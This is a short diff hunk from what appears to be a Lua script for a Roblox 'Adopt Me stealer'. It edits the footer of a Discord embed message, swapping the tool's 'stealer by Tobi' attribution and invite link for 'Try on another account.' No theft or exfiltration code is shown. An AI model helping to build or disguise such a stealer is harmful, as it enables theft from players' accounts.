@@ -198,7 +198,7 @@ local function SendJoinMessage(list, prefix)
             ["color"] = 65280,
             ["fields"] = fields,
             ["footer"] = {
-                ["text"] = "Adopt Me stealer by Tobi. discord.gg/GY2RVSEGDT"
+                ["text"] = "Try on another account."
             }
         }}
     }
